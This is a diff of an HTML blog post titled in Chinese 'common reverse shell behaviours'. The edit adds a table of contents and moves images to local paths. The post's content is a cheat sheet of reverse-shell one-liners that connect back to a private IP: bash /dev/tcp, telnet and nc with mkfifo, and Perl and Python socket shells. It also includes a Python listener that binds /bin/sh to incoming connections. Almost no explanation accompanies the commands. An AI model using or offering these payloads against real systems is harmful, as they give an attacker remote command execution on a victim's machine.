@@ -89,7 +89,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#常见的反弹shell行为"><span class="toc-text">常见的反弹shell行为</span></a></li></ol>
 </div>
     
 </div>
@@ -132,20 +132,19 @@
 </span>
     </div>
     <div class="post-content ">
-        <p>常见的</p>
-<p>bash -i &gt;&amp; /dev/tcp/10.107.98.24/2345 0&gt;&amp;1</p>
-<p> <img src="https://img2018.cnblogs.com/blog/1205448/201904/1205448-20190418175447785-921875598.png" alt="img"></p>
-<p>telnet 10.107.98.24 4444 | /bin/bash | telnet 10.107.98.24 5555</p>
-<p> <img src="https://img2018.cnblogs.com/blog/1205448/201904/1205448-20190418175457853-1020271368.png" alt="img"></p>
-<p>rm /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.107.98.24 4444 &gt;/tmp/f</p>
-<p> <img src="https://img2018.cnblogs.com/blog/1205448/201904/1205448-20190418175505664-217850218.png" alt="img"></p>
+        <h1 id="常见的反弹shell行为"><a href="#常见的反弹shell行为" class="headerlink" title="常见的反弹shell行为"></a>常见的反弹shell行为</h1><p><code>bash -i &gt;&amp; /dev/tcp/10.107.98.24/2345 0&gt;&amp;1</code></p>
+<p> <img src="../images/a13/1.png" alt="img"> </p>
+<p><code>telnet 10.107.98.24 4444 | /bin/bash | telnet 10.107.98.24 5555</code></p>
+<p> <img src="../images/a13/2.png" alt="img"></p>
+<p> <code>rm /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.107.98.24 4444 &gt;/tmp/f</code></p>
+<p> <img src="../images/a13/3.png" alt="img"></p>
 <p>perl -e ‘use Socket;$i=”10.107.98.24”;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<p> <img src="https://img2018.cnblogs.com/blog/1205448/201904/1205448-20190418175515778-247394833.png" alt="img"></p>
+<p> <img src="../images/a13/4.png" alt="img"></p>
 <p>socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.107.98.24”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
-<p> <img src="https://img2018.cnblogs.com/blog/1205448/201904/1205448-20190418175523584-439039581.png" alt="img"></p>
+<p> <img src="../images/a13/5.png" alt="img"></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket import *</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">import subprocess</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import os, threading, sys, time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    <span class="attribute">server</span>=socket(AF_INET,SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    server.bind((<span class="string">'0.0.0.0'</span>,4444))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    server.listen(5)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    <span class="builtin-name">print</span> <span class="string">'waiting for connect'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">    talk, addr = server.accept()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    <span class="builtin-name">print</span> <span class="string">'connect from'</span>,addr</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    proc = subprocess.Popen([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>], <span class="attribute">stdin</span>=talk,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">            <span class="attribute">stdout</span>=talk, <span class="attribute">stderr</span>=talk, <span class="attribute">shell</span>=<span class="literal">True</span>)</span></pre></td></tr></table></figure>
 
-<p><img src="https://img2018.cnblogs.com/blog/1205448/201904/1205448-20190418175722659-132643073.png" alt="img"></p>
+<p><img src="../images/a13/6.png" alt="img"></p>
 <p>非bash</p>
 <p>python -c “exec(&quot;import socket, subprocess;s = socket.socket();s.connect((‘10.107.97.119 ‘,4444))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())&quot;)”</p>
 <p>perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”10.107.97.119:4444”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’</p>
